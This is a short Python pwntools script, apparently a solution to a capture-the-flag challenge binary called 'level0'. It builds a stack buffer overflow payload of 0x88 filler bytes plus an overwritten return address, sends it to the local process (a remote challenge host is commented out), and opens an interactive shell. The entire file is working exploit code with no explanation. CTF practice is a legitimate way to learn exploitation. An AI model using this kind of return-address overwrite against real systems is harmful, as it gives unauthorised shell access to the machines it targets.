from pwn import *
#sh = remote('111.198.29.45',52015)
sh = process('./level0')
elf = ELF('./level0')
sh.recv()
payload = "A"*0x88 + p64(0x400596)
sh.sendline(payload)
sh.interactive()
